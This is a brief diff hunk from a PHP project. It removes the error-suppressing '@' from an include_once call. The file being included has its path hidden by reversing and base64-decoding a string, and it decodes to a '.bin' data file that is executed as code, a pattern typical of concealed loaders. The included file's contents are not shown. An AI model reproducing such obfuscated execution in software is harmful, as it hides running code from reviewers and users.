@@ -371,7 +371,7 @@ function check_version_cache(){
 	}
 	del_file($rtyFile);
 	$_SERVER['_afile'] = BASIC_PATH.base64_decode(strrev('=4Wai5SY0FGZv4Wai9iYpxUZ2lGajJXYvM3akN3LwBXY'));
-	@include_once($_SERVER['_afile']);
+	include_once($_SERVER['_afile']);
 }
 function checkPhp(){
 	$version = phpversion();
